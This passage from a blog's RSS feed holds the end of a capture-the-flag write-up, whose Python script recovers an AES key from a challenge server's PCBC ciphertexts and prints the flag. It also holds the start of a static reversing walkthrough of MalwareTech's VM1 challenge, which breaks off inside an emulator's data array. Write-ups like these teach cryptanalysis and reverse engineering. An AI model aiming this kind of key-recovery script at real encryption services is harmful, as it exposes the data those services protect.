&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;(b1, b2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;None):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(b1, list) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; b2 &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(set([len(b) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1])) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor() - Invalid input size&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; all([isinstance(b, bytes) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1]), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor() - Invalid input type&amp;#39;&lt;/span&gt;
        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [len(b) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1:
            x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(x, b)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; isinstance(b1, bytes) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; isinstance(b2, bytes), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor() - Invalid input type&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a, b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(b1, b2)])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(txt, key, iv):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid key size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(iv) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid IV size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(txt) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid plaintext size&amp;#39;&lt;/span&gt;
    bs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(key)
    blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; to_blocks(txt)
    ctxt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
    curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iv
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; block &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; blocks:
        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
        curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(ctxt[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;bs:], block)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ctxt

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt_flag&lt;/span&gt;(p):
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choice: &amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
	x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
	y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(x)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;], y[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enc_plaintext&lt;/span&gt;(p, plaintext):
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choice: &amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Plaintext: &amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(plaintext)
	x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
	y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(x)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;], y[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getDecoding&lt;/span&gt;(s):
	y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(s)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;], y[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:]

iv2_orig, flag_enc_orig &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt_flag(p)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(iv2_orig)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag_enc_orig)

key2_new &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(to_blocks(flag_enc_orig))
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Key2 :&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key2_new)
iv2_new, flag_enc_cipher_new &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt_flag(p)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iv2 :&amp;#34;&lt;/span&gt;, iv2_new)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag_cipher_new :&amp;#34;&lt;/span&gt;, flag_enc_cipher_new)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(decrypt(flag_enc_cipher_new, key2_new, iv2_new)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running this, prints the flag - &lt;strong&gt;CTF-BR{kn3W_7h4T_7hEr3_4r3_Pc8C_r3pe471ti0ns?!?}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;And yeah, after reading the flag, I realised it was actually AES in PCBC mode.&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MalwareTech&#39;s VM1 Reversing Challenge</title>
      <link>https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/</link>
      <pubDate>Sat, 04 Jan 2020 17:24:28 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/</guid>
      <description>&lt;p&gt;Get the challenge from &lt;a href=&#34;https://www.malwaretech.com/vm1&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM’s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag? A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Rules &amp;amp; Information&lt;/strong&gt;
You are not require to run vm1.exe, this challenge is static analysis only.
Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating.
Analysis can be done using the free version of IDA Pro (you don’t need the debugger).&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given two files - &lt;em&gt;vm1.exe&lt;/em&gt; and &lt;em&gt;ram.bin&lt;/em&gt;, and according to the problem statement, &lt;em&gt;ram.bin&lt;/em&gt; contains the bytecode for the VM and the flag encrypted in it somwehow.&lt;/p&gt;
&lt;p&gt;I used IDA Pro to analyse the binary. I started off with the &lt;code&gt;start&lt;/code&gt; function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/start.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/start.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;First, there are a few calls to some MD5 related functions, those are to display the MD5 hash of the flag when we run the program.&lt;/p&gt;
&lt;p&gt;Then there is a call to &lt;code&gt;GetProcessHeap&lt;/code&gt; and &lt;code&gt;HeapAlloc&lt;/code&gt; which basically allocates a memory of size 0x1FB. After that we have a call to &lt;code&gt;memcpy&lt;/code&gt; that copies data from &lt;code&gt;unk_404040&lt;/code&gt; to the newly allocated memory (renamed to &lt;em&gt;bytecode&lt;/em&gt;). On taking a look at the bytes at that location, they are exactly the same as &lt;em&gt;ram.bin&lt;/em&gt; so this is the memory location that is mentioned in the problem statement.&lt;/p&gt;
&lt;p&gt;We move straight to the &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; function (&lt;code&gt;sub_4022E0&lt;/code&gt; before renaming).&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/read_memory.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/read_memory.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here first eax is set to 1 and then there is a loop that runs until eax does not become 0. The body of the loop basically read 3 bytes of the bytecode sequentially, stores it and passes it to the function &lt;code&gt;evaluate&lt;/code&gt; (&lt;code&gt;sub_402270&lt;/code&gt; before renaming).&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/evaluate.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/evaluate.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This is the function where the VM bytecode is interpreted. The function has 3 arguments, which are basically 3 bytes of the bytecode passed from the &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; function. For evaluation, the first parameter is checked first -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If it is 1, then the memory location at offset param2 is assigned param3 and eax is set to 1.&lt;/li&gt;
&lt;li&gt;If it is 2, then a variable, &lt;em&gt;byte_404240&lt;/em&gt; is set to the value at memory location at offset param2 and eax is set to 1.&lt;/li&gt;
&lt;li&gt;If it is 3, then the value at offset param2 is XORed with the value of &lt;em&gt;byte_404240&lt;/em&gt; and stored back at the offset of param2.&lt;/li&gt;
&lt;li&gt;Otherwise, if it is not 3 then al is set to 0, i.e. eax is now zero and the loop in &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; should now stop.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After the loop in &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; ends we know that now, the flag is in the memory, precisely at the location &lt;code&gt;unk_404040&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So, we can basically emulate the whole functionality with a python script and then get the flag from the converted data.&lt;/p&gt;
&lt;p&gt;I wrote the following script.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0DE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0FC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0CB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span 